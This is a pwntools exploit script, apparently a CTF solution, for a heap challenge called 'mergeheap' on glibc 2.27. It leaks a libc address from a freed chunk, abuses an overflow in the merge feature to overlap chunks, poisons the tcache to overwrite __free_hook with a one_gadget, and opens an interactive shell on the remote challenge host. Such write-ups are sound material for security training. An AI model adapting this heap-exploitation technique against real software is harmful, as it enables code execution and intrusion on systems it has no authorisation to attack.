from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./mergeheap"
libc_path = "/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6"
#libc_path = "./libc.so.6"
ld_path = "/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node5.buuoj.cn", 27704)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(size, content):
    io.sendlineafter(">>", "1")
    io.sendlineafter("len:", str(size))
    io.sendafter("content:", content)
    if len(content) != size:
        io.send("\n")


def free(idx):
    io.sendlineafter(">>", "3")
    io.sendlineafter("idx:", str(idx))


def show(idx):
    io.sendlineafter(">>", "2")
    io.sendlineafter("idx:", str(idx))


def merge(idx1, idx2):
    io.sendlineafter(">>", "4")
    io.sendlineafter("idx1:", str(idx1))
    io.sendlineafter("idx2:", str(idx2))


for i in range(8):
    add(0x80, "a")

for i in range(1, 8):
    free(i)

free(0)

# fd -> "a"*8 -> leak bk
add(0x8, b"a" * 8)
show(0)
libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x3ebd20
success("libcbase -> " + hex(libc.address))

free_hook = libc.symbols["__free_hook"]
one_gadget = libc.address + 0x4f322

add(0x60, "a")
add(0x30, "a" * 0x30) # 2
add(0x38, "a" * 0x38) # 3
add(0x100, "b") # 4
add(0x68, "b") # 5
add(0x20, "b") # 6
add(0x20, "b") # 7
add(0x20, "b") # 8
add(0x20, "b") # 9

free(5)
free(7)
free(8)

# merge 2 chunks -> strcat/strcpy -> overlap
merge(2, 3)

ddebug()
free(6)
payload = b"a" * 0x28 + p64(0x31) + p64(free_hook) + p64(0)
add(0x100, payload)

add(0x20, "aaaa")
add(0x20, "aaaa")
add(0x20, p64(one_gadget)) # free_hook -> onegadget

free(9)

io.interactive()
